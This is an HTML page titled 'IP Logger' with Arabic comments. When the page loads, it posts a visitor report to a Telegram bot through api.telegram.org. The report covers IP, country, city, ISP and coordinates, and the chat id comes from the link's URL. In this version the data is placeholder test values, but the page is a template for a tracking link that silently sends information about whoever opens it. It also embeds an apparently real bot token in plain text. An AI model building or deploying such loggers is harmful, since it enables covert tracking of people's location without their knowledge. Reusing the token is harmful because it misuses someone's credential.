<!DOCTYPE html>
<html>
<head>
    <title>IP Logger</title>
    <script>
        // حطيت التوكن مباشرة هنا عشان نتأكد من شغله
        const botToken = '8785733862:AAHXR0EP-Cj8nPCEHDM6P4eOVJOJ6PUHlKg';

        async function sendInfo() {
            try {
                const urlParams = new URLSearchParams(window.location.search);
                const chatId = urlParams.get('id');

                if (!chatId) {
                    document.body.innerHTML = '<h1>⚠️ رابط غير صالح</h1>';
                    return;
                }

                // بيانات وهمية للاختبار
                const testData = {
                    ip: '192.168.1.1',
                    country: 'مصر',
                    city: 'القاهرة',
                    region: 'القاهرة',
                    org: 'مزود تجريبي',
                    loc: '30.0444,31.2357'
                };

                const message = `
🕵️ **تم تسجيل دخول جديد! (اختبار)**
📌 **IP:** ${testData.ip}
📍 **الدولة:** ${testData.country}
🏙️ **المدينة:** ${testData.city}
🗺️ **المنطقة:** ${testData.region}
🌐 **المزود:** ${testData.org}
📍 **الموقع:** ${testData.loc}
                `;

                await fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        chat_id: chatId,
                        text: message,
                        parse_mode: 'Markdown'
                    })
                });

                document.body.innerHTML = '<h1>✅ تم الإرسال بنجاح</h1>';

            } catch (error) {
                console.error('خطأ:', error);
                document.body.innerHTML = '<h1>❌ حدث خطأ، حاول مرة أخرى</h1>';
            }
        }

        window.onload = sendInfo;
    </script>
</head>
<body>
    <h1>جاري تحميل البيانات...</h1>
</body>
</html>
